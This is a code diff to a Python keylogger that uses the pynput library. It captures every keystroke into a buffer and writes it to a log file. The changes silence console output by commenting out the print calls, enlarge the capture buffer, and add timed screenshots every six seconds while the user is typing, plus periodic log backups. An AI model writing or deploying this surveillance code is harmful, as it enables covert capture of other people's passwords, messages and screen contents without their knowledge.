@@ -1,5 +1,4 @@
-from util import utilities
-from logger import logger
+from log import logger, screenshot
 from pynput import keyboard
 from pynput.keyboard import Key, Listener, KeyCode, Controller
 from countdown import Countdown
@@ -16,8 +15,8 @@ is_shift_pressed:bool = False
 should_register:bool = True
 is_idle:bool = True
 key_buffer:list[str] = list()
-buffer_capacity:int = 15
-elements_to_preserve:int = 3
+buffer_capacity:int = 500
+elements_to_preserve:int = 20
 
 lang_change_listener:Listener
 _keyboard = Controller()
@@ -32,7 +31,7 @@ def on_pressed(key):
         else:
             is_idle = False
             if should_register:
-                print(key.char)
+                # print(key.char)
                 key_buffer.append(key.char)
     else:
         if __check_for_combination_key(key):
@@ -41,14 +40,14 @@ def on_pressed(key):
         if should_register:
             if key == Key.space:
                 is_idle = False
-                print(" ")
+                # print(" ")
                 key_buffer.append(" ")
             elif key == Key.backspace:
                 if len(key_buffer) > 0:
                     del key_buffer[-1]
             elif key == Key.enter:
                 is_idle = False
-                print("\n")
+                # print("\n")
                 key_buffer.append("\n")
 
     if len(key_buffer) == buffer_capacity:
@@ -93,12 +92,12 @@ def __check_for_special_handling(unicode):
             should_register = True
         elif unicode == D_code:     #force dump contents of array in file
             __log_buffer(is_dump=True)
-        elif unicode == T_code:     #wait for logging to complete if ongoing, and exit
+        elif unicode == T_code:     #wait for log to complete if ongoing, and exit
             __exit_safely()
 
 
 def __log_buffer(is_dump:bool=False):
-    global key_buffer, elements_to_preserve
+    global key_buffer, elements_to_preserve, is_idle
     if is_dump:
         logger.log_to_file(buffer=key_buffer, is_dump=is_dump)
         key_buffer = list()
@@ -110,12 +109,18 @@ def __log_buffer(is_dump:bool=False):
 
 def __check_for_new_characters():
     global is_idle
-
     if not is_idle or len(key_buffer) == 0:
         is_idle = True
         return
 
     __log_buffer(is_dump=True)
+
+
+def __take_screenshot():
+    global is_idle
+    if not is_idle:
+        screenshot.take_screenshot()
+        is_idle = True
 
 
 def __exit_safely():
@@ -127,14 +132,10 @@ def __exit_immediately(*args):
     exit(0)
 
 
-
-
-
-
 def __init_executors():
     logger.init()
-    # Countdown.make_and_start("idle checker", 3, __check_for_new_characters)
-    # Countdown.make_and_start("two", 1, lambda : print("TWO callback"))
+    Countdown.make_and_start("screenshots", 6, __take_screenshot)
+    Countdown.make_and_start("backup logs", 25 * 60, __check_for_new_characters)
 
 
 def __shutdown_executors():
@@ -144,9 +145,9 @@ def __shutdown_executors():
 
 # ________________________________________ START _________________________________________________
 
-
 __init_executors()
 
 with keyboard.Listener(on_press=on_pressed, on_release=on_release) as listener:
+    # print(threading.active_count())
     listener.join()
 
